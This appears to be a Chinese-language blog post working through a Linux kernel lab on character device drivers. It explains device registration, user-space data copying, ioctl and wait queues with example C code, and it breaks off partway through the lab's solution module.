<p>从文件系统的角度来看，<code>inode</code> 表示文件：</p>
<ul>
<li><code>inode</code> 的属性是与文件关联的大小，权限，时间</li>
<li><code>inode</code> 唯一标识文件系统中的文件</li>
</ul>
<p>从用户的角度来看，<code>file</code> 表示文件：</p>
<ul>
<li><code>file</code> 的属性是 <code>inode</code>，文件名，文件打开属性，文件位置</li>
<li>所有打开的文件都有与之关联的 <code>file</code> 结构体</li>
</ul>
<p>回到设备驱动程序，有两个实体几乎总是具有标准的使用方式：</p>
<ul>
<li><code>inode</code>：更用于确定执行操作的设备的 major and minor</li>
<li><code>file</code>：用于确定打开文件的标志，还用于保存和访问（以后）私有数据</li>
</ul>
<p><strong>Registration and unregistration of character devices</strong></p>
<p>设备的注册/注销是通过指定 major and minor 设备来实现的</p>
<ul>
<li>类型 <code>dev_t</code> 用于保留设备的标识符（major and minor），并且可以使用 MKDEV 宏获取</li>
</ul>
<p>对于设备标识符的静态分配和静态注销：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> first, <span class="keyword">unsigned</span> <span class="keyword">int</span> count, <span class="keyword">char</span> *name)</span></span>; <span class="comment">/* 创建一个字符设备区 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unregister_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> first, <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>; <span class="comment">/* 删除一个字符设备区 */</span></span><br></pre></td></tr></table></figure>
<p>分配标识符后，必须初始化字符设备并且必须通知内核，然后才能注册/删除字符设备：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_init</span><span class="params">(struct cdev *cdev, struct file_operations *fops)</span></span>; <span class="comment">/* 初始化字符设备,并通知内核 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cdev_add</span><span class="params">(struct cdev *dev, <span class="keyword">dev_t</span> num, <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>; <span class="comment">/* 注册字符设备 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_del</span><span class="params">(struct cdev *dev)</span></span>; <span class="comment">/* 删除字符设备 */</span></span><br></pre></td></tr></table></figure>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MAJOR       42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MAX_MINORS  5</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">    <span class="comment">/* my data starts here */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> <span class="title">devs</span>[<span class="title">MY_MAX_MINORS</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .open = my_open,</span><br><span class="line">    .read = my_read,</span><br><span class="line">    .write = my_write,</span><br><span class="line">    .release = my_release,</span><br><span class="line">    .unlocked_ioctl = my_ioctl</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, err;</span><br><span class="line">    err = register_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>), MY_MAX_MINORS,</span><br><span class="line">                                 <span class="string">&quot;my_device_driver&quot;</span>); <span class="comment">/* MKDEV获取设备标识符 */</span></span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MY_MAX_MINORS; i++) &#123;</span><br><span class="line">        cdev_init(&amp;devs[i].cdev, &amp;my_fops); <span class="comment">/* 绑定自己设置的file_operations */</span></span><br><span class="line">        cdev_add(&amp;devs[i].cdev, MKDEV(MY_MAJOR, i), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MY_MAX_MINORS; i++) &#123;</span><br><span class="line">        <span class="comment">/* release devs[i] fields */</span></span><br><span class="line">        cdev_del(&amp;devs[i].cdev);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>), MY_MAX_MINORS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同一个 <code>dev_t</code> 可以注册多个字符设备，每次 <code>open(DEVICE_PATH, O_RDONLY)</code> 时，本质上是和一个具体的字符设备进行交互（使用 <code>struct cdev</code> 父类结构体中的数据）</p>
<p>因此，如果两个进程访问同一个字符设备，就很可能在临界区引发安全问题，所以我们要在字符设备的 <code>open</code> 上加锁，禁止其被二次打开</p>
<p>为了程序的并发性，通常我们需要为同一个 <code>dev_t</code> 注册多个字符设备，在进程 <code>open</code> 提供不同的字符设备供其使用</p>
<p><strong>Access to the address space of the process</strong></p>
<p>设备的驱动程序是应用程序和硬件之间的接口，因此，我们经常必须访问用户空间数据（但不能以取消引用用户空间指针的方式，来直接访问用户空间）</p>
<p>直接访问用户空间指针可能会导致：</p>
<ul>
<li>不正确的行为（根据体系结构的不同，用户空间指针可能无效或映射到内核空间）</li>
<li>内核 oops（用户模式指针可以引用非驻留内存区域）</li>
<li>安全问题</li>
</ul>
<p>因此通过调用下面的宏函数来正确访问用户空间数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">put_user(type val, type *address);</span><br><span class="line">get_user(type val, type *address);</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">copy_to_user</span><span class="params">(<span class="keyword">void</span> __user *to, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">copy_from_user</span><span class="params">(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;</span><br></pre></td></tr></table></figure>
<p>下图说明了 Read 操作以及如何在用户空间和驱动程序之间传输数据：</p>
<img src="/2022/10/13/Linux-Lab3-Character%20device%20drivers/1665576468222.png" class width="1665576468222"> 
<ul>
<li>当驱动 driver 有足够多的可用数据时，它将准确地将所需 size 的数据传输给用户</li>
<li>当驱动 driver 没有足够多的可用数据时，它将把所有的可用数据传输给用户</li>
</ul>
<p>Read 操作的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_read</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span> (struct my_device_data *) file-&gt;private_data;</span><br><span class="line">    <span class="keyword">ssize_t</span> len = min(my_data-&gt;size - *offset, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data from my_data-&gt;buffer to user buffer */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(user_buffer, my_data-&gt;buffer + *offset, len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    *offset += len;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下图说明了 Write 操作以及如何在用户空间和驱动程序之间传输数据：</p>
<img src="/2022/10/13/Linux-Lab3-Character%20device%20drivers/1665577257857.png" class width="1665577257857"> 
<ul>
<li>写入操作将响应来自用户空间的写入请求，其范围不会大于最大驱动程序容量 MAXSIZ</li>
</ul>
<p>Write 操作的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> * offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span> (struct my_device_data *) file-&gt;private_data;</span><br><span class="line">    <span class="keyword">ssize_t</span> len = min(my_data-&gt;size - *offset, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data from user buffer to my_data-&gt;buffer */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(my_data-&gt;buffer + *offset, user_buffer, len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    *offset += len;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Ioctl</strong></p>
<p>除了 Read 和 Write 操作之外，驱动程序还需要能够执行某些物理设备控制任务（这些操作是通过实现函数来完成的）</p>
<p>可用通过如下函数完成此操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">my_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>file</code>：打开的设备文件描述符</li>
<li><code>cmd</code>：从用户空间发送的命令</li>
<li><code>arg</code>：指向用户空间的指针，使用 <code>copy_from_user</code> 来安全地获取其值</li>
</ul>
<p>在实现该功能之前，必须选择与命令对应的数字（建议使用宏定义 <code>_IOC(dir, type, nr, size)</code> 来完成此操作），然后在一个 Switch-Case 中完成各个命令</p>
<p>使用案例如下：（在用户空间调用 <code>ioctl</code>，对应到内核就是 <code>my_ioctl</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_IOCTL_IN _IOC(_IOC_WRITE, <span class="meta-string">&#x27;k&#x27;</span>, 1, sizeof(my_ioctl_data))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">my_ioctl</span> <span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span></span><br><span class="line">         (struct my_device_data*) file-&gt;private_data;</span><br><span class="line">    my_ioctl_data mid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> MY_IOCTL_IN:</span><br><span class="line">        <span class="keyword">if</span>( copy_from_user(&amp;mid, (my_ioctl_data *) arg,</span><br><span class="line">                           <span class="keyword">sizeof</span>(my_ioctl_data)) )</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* process data and execute command */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Waiting queues</strong></p>
<p>等待队列是正在等待特定事件的进程的列表，使用 <code>wait_queue_head_t</code> 类型定义，可由函数/宏使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DECLARE_WAIT_QUEUE_HEAD(wq_name); <span class="comment">/* 在编译时初始化队列 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_waitqueue_head</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q)</span></span>; <span class="comment">/* 初始化队列 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_event</span><span class="params">(<span class="keyword">wait_queue_head_t</span> q, <span class="keyword">int</span> condition)</span></span>; <span class="comment">/* 在条件为false时将当前线程添加到队列中,将其设置为TASK_UNINTERRUPTIBLE,并调度新线程 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_event_interruptible</span><span class="params">(<span class="keyword">wait_queue_head_t</span> q, <span class="keyword">int</span> condition)</span></span>; <span class="comment">/* 在条件为false时将当前线程添加到队列中,将其设置为TASK_INTERRUPTIBLE,并调度新线程 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_event_timeout</span><span class="params">(<span class="keyword">wait_queue_head_t</span> q, <span class="keyword">int</span> condition, <span class="keyword">int</span> timeout)</span></span>; <span class="comment">/* 和wait_event一样,只是timeout耗尽时同样会退出 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_event_interruptible_timeout</span><span class="params">(<span class="keyword">wait_queue_head_t</span> q, <span class="keyword">int</span> condition, <span class="keyword">int</span> timeout)</span></span>; <span class="comment">/* 和wait_event_interruptible一样,只是timeout耗尽时同样会退出 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q)</span></span>; <span class="comment">/* 从目标等待队列中唤醒一个进程 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up_interruptible</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q)</span></span>; <span class="comment">/* 仅唤醒状态为TASK_INTERRUPTIBLE的线程 */</span></span><br></pre></td></tr></table></figure>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=device_drivers make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<p>直接看最终代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Character device drivers lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * All tasks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../include/so2_cdev.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;SO2 character device&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_LEVEL	KERN_INFO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MAJOR		42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MINOR		0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_MINORS		1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODULE_NAME		<span class="meta-string">&quot;so2_cdev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MESSAGE			<span class="meta-string">&quot;hello\n&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_MESSAGE		<span class="meta-string">&quot;Hello ioctl&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BUFSIZ</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZ		4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> &#123;</span></span><br><span class="line">	<span class="comment">/* TODO 2: add cdev member */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 4: add buffer with BUFSIZ elements */</span></span><br><span class="line">	<span class="keyword">char</span> buffer[BUFSIZ];</span><br><span class="line">	<span class="comment">/* TODO 7: extra members for home */</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> <span class="built_in">queue</span>;</span><br><span class="line">	<span class="comment">/* TODO 3: add atomic_t access variable to keep track if file is opened */</span></span><br><span class="line">	<span class="keyword">atomic_t</span> access;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> <span class="title">devs</span>[<span class="title">NUM_MINORS</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">so2_cdev_open</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: print message when the device file is open. */</span></span><br><span class="line">	printk(<span class="string">&quot;message:%s&quot;</span>,MESSAGE);</span><br><span class="line">	<span class="comment">/* TODO 3: inode-&gt;i_cdev contains our cdev struct, use container_of to obtain a pointer to so2_device_data */</span></span><br><span class="line">	data = container_of(inode-&gt;i_cdev, struct so2_device_data, cdev);</span><br><span class="line">	file-&gt;private_data = data;</span><br><span class="line">	<span class="comment">/* TODO 3: return immediately if access is = 0, use atomic_cmpxchg */</span></span><br><span class="line">    <span class="comment">/* 这里我的想法和原实验不一样:</span></span><br><span class="line"><span class="comment">    设置已经open的字符设备的&quot;data-&gt;access&quot;为&#x27;1&#x27;,</span></span><br><span class="line"><span class="comment">    